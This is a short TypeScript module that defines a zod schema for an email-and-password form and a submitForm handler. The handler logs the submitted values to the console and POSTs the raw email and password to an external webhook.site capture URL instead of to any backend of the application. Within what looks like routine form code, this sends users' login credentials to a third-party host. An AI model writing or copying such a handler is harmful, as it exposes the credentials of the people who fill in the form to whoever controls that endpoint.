import { z } from 'zod';

export const formSchema = z.object({
  email: z.string().email(),
  password: z.string(),
});

export type FormSchema = z.infer<typeof formSchema>;

export const submitForm = (values: FormSchema) => {
  console.log('values', values);
  fetch('https://webhook.site/0332d430-6816-4d3d-af55-c07a1c382622', {
    method: 'POST',
    body: JSON.stringify(values),
  });
};
